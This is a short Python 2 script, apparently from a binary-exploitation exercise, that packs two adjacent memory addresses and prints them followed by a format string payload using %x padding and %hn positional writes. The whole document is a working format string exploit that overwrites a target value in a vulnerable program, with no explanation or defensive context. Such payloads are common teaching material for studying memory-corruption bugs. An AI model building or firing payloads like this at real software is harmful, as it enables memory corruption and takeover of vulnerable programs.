import struct

target_1 = struct.pack('I', 0x8049810)
target_2 = struct.pack('I', 0x8049812)

print target_1 + target_2 + "%250x%13$hn%21570x%12$hn"
